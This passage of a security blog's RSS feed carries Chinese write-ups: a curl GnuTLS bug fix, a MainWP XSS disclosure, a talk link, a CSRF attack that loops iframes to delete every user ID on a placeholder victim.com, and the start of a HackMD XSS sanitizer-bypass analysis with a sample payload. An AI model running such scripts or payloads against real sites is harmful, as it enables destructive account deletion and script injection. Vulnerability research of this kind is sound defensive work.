&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;give_ssl_ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* gnutls always returns its session */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backend&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLSSLBACKEND_OPENSSL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 错误的后端标识
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;internals&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gtls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;当调用方根据backend字段动态决策时，会将gnutls_session_t错误解析为SSL_CTX/SSL结构&lt;/li&gt;
&lt;li&gt;可能导致崩溃或其他未知影响，具体取决于应用程序如何处理错误指针&lt;/li&gt;
&lt;li&gt;缓解因素：需同时链接GnuTLS和OpenSSL库的罕见场景才会触发&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;curl 8.15.0&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;构建同时支持GnuTLS和OpenSSL的应用程序&lt;/li&gt;
&lt;li&gt;使用curl_easy_getinfo获取CURLINFO_TLS_SESSION或CURLINFO_TLS_SSL_PTR&lt;/li&gt;
&lt;li&gt;当检测到CURLSSLBACKEND_OPENSSL时调用OpenSSL函数&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
&lt;/h2&gt;&lt;p&gt;已通过PR #17976修复：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- info-&amp;gt;backend = CURLSSLBACKEND_OPENSSL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ info-&amp;gt;backend = CURLSSLBACKEND_GNUTLS;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;补充说明&#34;&gt;补充说明
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;HTTP/3不支持MultiSSL特性，降低了实际影响&lt;/li&gt;
&lt;li&gt;该问题更倾向于普通bug而非安全漏洞&lt;/li&gt;
&lt;li&gt;项目方基于透明度原则选择公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>MainWP成本跟踪器笔记字段反射型XSS漏洞分析</title>
        <link>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 06:33:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;mainwp成本跟踪器笔记字段反射型xss漏洞报告&#34;&gt;MainWP成本跟踪器笔记字段反射型XSS漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;在MainWP客户端管理面板的&amp;quot;成本跟踪器&amp;quot;模块中（版本5.4.0.11），&amp;ldquo;笔记&amp;quot;输入字段存在反射型跨站脚本（XSS）漏洞。当用户添加或编辑成本时，可在笔记字段输入任意内容，若包含恶意JavaScript代码（如XSS有效载荷），由于缺乏适当的输入清理和输出编码，该代码会在保存后立即执行。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;：反射型XSS（非持久性）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;触发条件&lt;/strong&gt;：提交包含恶意脚本的笔记内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：当前会话立即执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根本原因&lt;/strong&gt;：用户输入未经过适当清理或编码就被反射回HTML响应&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;可能成为更严重XSS漏洞的入口点&lt;/li&gt;
&lt;li&gt;对客户端安全构成风险（特别是在使用浏览器扩展、调试工具或集成第三方脚本的环境中）&lt;/li&gt;
&lt;li&gt;降低对平台安全编码实践的信任度&lt;/li&gt;
&lt;li&gt;可能被拥有仪表板访问权限的攻击者（如内部威胁或低权限用户）用来测试其他注入点&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;2025年6月10日：漏洞报告提交&lt;/li&gt;
&lt;li&gt;同日11:39：MainWP团队将状态改为&amp;quot;已分类&amp;rdquo;&lt;/li&gt;
&lt;li&gt;同日16:05：发布补丁版本（mainwp.zip）&lt;/li&gt;
&lt;li&gt;6月11日：验证发现补丁未完全修复&lt;/li&gt;
&lt;li&gt;经过多次测试确认，最终在5.4.0.12版本中完全修复&lt;/li&gt;
&lt;li&gt;6月13日：所有相关问题解决并发布，向研究者支付50美元奖金&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;6月10日06:39：初始报告&lt;/li&gt;
&lt;li&gt;6月11日09:41：确认修复&lt;/li&gt;
&lt;li&gt;6月13日16:43：漏洞关闭并发放奖金&lt;/li&gt;
&lt;li&gt;7月17日：报告公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;对所有用户输入实施严格的清理和编码&lt;/li&gt;
&lt;li&gt;采用内容安全策略(CSP)作为额外防护层&lt;/li&gt;
&lt;li&gt;定期进行安全审计和渗透测试&lt;/li&gt;
&lt;li&gt;建立漏洞奖励计划鼓励负责任的披露&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>AVTOKYO2015演讲分享：漏洞猎手的烦恼与XSS漏洞技术细节</title>
        <link>http://localhost:1313/p/avtokyo2015%E6%BC%94%E8%AE%B2%E5%88%86%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%8C%8E%E6%89%8B%E7%9A%84%E7%83%A6%E6%81%BC%E4%B8%8Exss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/</link>
        <pubDate>Wed, 06 Aug 2025 05:39:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/avtokyo2015%E6%BC%94%E8%AE%B2%E5%88%86%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%8C%8E%E6%89%8B%E7%9A%84%E7%83%A6%E6%81%BC%E4%B8%8Exss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/</guid>
        <description>&lt;h1 id=&#34;我在avtokyo2015的演讲漏洞猎手的烦恼&#34;&gt;我在AVTOKYO2015的演讲：漏洞猎手的烦恼
&lt;/h1&gt;&lt;p&gt;本文分享我在AVTOKYO2015会议上的演讲幻灯片。AVTOKYO2015是一场于2015年11月14日在东京举办的计算机安全会议。&lt;/p&gt;
&lt;p&gt;2013年9月，我遭遇了一个意外事件：由于ISP将我的XSS研究请求误判为攻击行为，导致我的网络连接被阻断。在演讲中，我详细讲述了这个令人沮丧的故事。同时，您还可以看到我2014年的漏洞挖掘收入数据，以及一些有趣XSS漏洞的技术细节。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;查看《漏洞猎手的烦恼》完整幻灯片&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;值得一提的是，我之前还做过题为《漏洞猎手的喜悦》的演讲，如果您感兴趣可以阅读：&lt;a class=&#34;link&#34; href=&#34;http://mksben.l0.cm/2015/07/codeblue.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://mksben.l0.cm/2015/07/codeblue.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;希望您能喜欢这些内容！
感谢！&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt;：&lt;br&gt;
网络安全, 幻灯片, XSS&lt;/p&gt;
</description>
        </item>
        <item>
        <title>通过CSRF暴力破解用户ID实现批量删除用户攻击</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87csrf%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%94%A8%E6%88%B7id%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB/</link>
        <pubDate>Wed, 06 Aug 2025 05:07:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87csrf%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%94%A8%E6%88%B7id%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;h1 id=&#34;通过csrf暴力破解用户id删除所有用户&#34;&gt;通过CSRF暴力破解用户ID删除所有用户
&lt;/h1&gt;&lt;p&gt;在测试某应用时发现&amp;quot;删除用户&amp;quot;模块未实施CSRF防护。攻击者只需构造恶意表单诱使管理员点击，即可任意删除用户账户。&lt;/p&gt;
&lt;h2 id=&#34;基础csrf攻击验证&#34;&gt;基础CSRF攻击验证
&lt;/h2&gt;&lt;p&gt;删除请求中未包含CSRF令牌，典型PoC如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://victim.com/delete&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;userid&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;12345&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;用户id暴力破解挑战&#34;&gt;用户ID暴力破解挑战
&lt;/h2&gt;&lt;p&gt;系统使用5位数字作为用户ID，但未在任何端点泄露ID信息。受&lt;a class=&#34;link&#34; href=&#34;https://pwndizzle.blogspot.in&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PwnDizzle的博客&lt;/a&gt;启发，尝试通过点击劫持暴力破解ID。&lt;/p&gt;
&lt;h2 id=&#34;技术突破点&#34;&gt;技术突破点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;X-Frame-Options限制&lt;/strong&gt;：应用设置了X-Frame-Options头，阻止iframe加载&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Origin验证&lt;/strong&gt;：XMLHttpRequest因服务端校验Origin头而失效&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最终方案&lt;/strong&gt;：通过iframe靶向提交请求（虽无法读取响应，但请求可成功发送）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击脚本实现&#34;&gt;攻击脚本实现
&lt;/h2&gt;&lt;p&gt;编写CSRF脚本自动遍历所有可能的用户ID，当管理员触发时即可删除所有现存用户：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 示例代码：批量发送删除请求
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;99999&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;iframe&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`https://victim.com/delete?userid=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;实施CSRF令牌机制&lt;/li&gt;
&lt;li&gt;使用随机UUID替代连续数字ID&lt;/li&gt;
&lt;li&gt;关键操作需二次认证&lt;/li&gt;
&lt;li&gt;设置速率限制防止暴力破解&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;该漏洞演示了当CSRF防护缺失时，结合其他弱点可能造成的灾难性后果。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HackMD中的可蠕虫化XSS漏洞分析</title>
        <link>http://localhost:1313/p/hackmd%E4%B8%AD%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 04:18:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hackmd%E4%B8%AD%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;可蠕虫化的hackmd-xss漏洞&#34;&gt;可蠕虫化的HackMD XSS漏洞
&lt;/h1&gt;&lt;p&gt;在Web安全领域，我通常更偏爱服务器端漏洞而非客户端漏洞（当然能直接获取shell的客户端漏洞除外XD）。控制他人服务器对我来说更有趣！正因如此，我以往较少关注XSS和CSRF等客户端漏洞（翻看记录只有2018年Google CTF那篇）。但这次发现的漏洞相当有趣，本着教育（和炫耀？）的心态决定撰文分享。&lt;/p&gt;
&lt;h2 id=&#34;背景介绍&#34;&gt;背景介绍
&lt;/h2&gt;&lt;p&gt;HackMD是一款台湾开发者打造的Markdown协作平台，被COSCUP、g0v、HITCON等台湾技术会议用作官方协作文档平台，甚至还是Ethereum的官方协作工具。其源代码已在GitHub开源（获得4500+星），在中国和欧洲也拥有大量用户。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现&#34;&gt;漏洞发现
&lt;/h2&gt;&lt;p&gt;在审查HackMD前端Markdown渲染的XSS防护机制时，发现其使用npm/xss库进行HTML过滤。关键在于&lt;code&gt;onIgnoreTag&lt;/code&gt;回调函数中对HTML注释标签的处理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;onIgnoreTag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!--&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 不过滤其属性
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;开发者本意是保留注释内容，但我们可以构造特殊注释来污染DOM：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;bar--&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Hi&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34; --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;csp绕过技术&#34;&gt;CSP绕过技术
&lt;/h2&gt;&lt;p&gt;HackMD实施了严格的内容安全策略(CSP)，但存在两个关键弱点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;允许&lt;code&gt;unsafe-eval&lt;/code&gt;&lt;/li&gt;
